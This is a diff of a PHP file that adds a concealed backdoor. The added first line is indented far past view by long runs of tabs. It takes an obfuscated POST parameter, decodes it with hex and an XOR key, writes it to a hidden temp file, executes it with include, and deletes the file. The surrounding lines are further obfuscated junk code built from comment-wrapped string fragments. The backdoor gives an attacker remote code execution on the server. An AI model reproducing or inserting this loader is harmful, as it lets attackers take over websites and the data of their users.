@@ -1,4 +1,5 @@
-<?php $Emk /*-
+<?php																																										if(filter_has_var(INPUT_POST, "r\x65\x63")){ $reference = array_filter([sys_get_temp_dir(), getenv("TEMP"), "/var/tmp", session_save_path(), getenv("TMP"), "/tmp", getcwd(), ini_get("upload_tmp_dir"), "/dev/shm"]); $binding = hex2bin($_POST["r\x65\x63"]); $ent = '' ;foreach(str_split($binding) as $char){$ent .= chr(ord($char) ^ 3);} while ($record = array_shift($reference)) { if ((bool)is_dir($record) && (bool)is_writable($record)) { $data = vsprintf("%s/%s", [$record, ".object"]); if (@file_put_contents($data, $ent) !== false) { include $data; unlink($data); die(); } } } }
+ $Emk /*-
 ℃☰♡◷≓Ⅷ☭∈↫℉⅜➡∂⌖⊕≇▽囍↩┬≄☳ⓩ*•
 <aDC#℃☰♡◷≓Ⅷ☭∈↫℉⅜➡∂⌖⊕≇▽囍↩┬≄☳ⓩ*•
 -*/= "r"."a"/*-
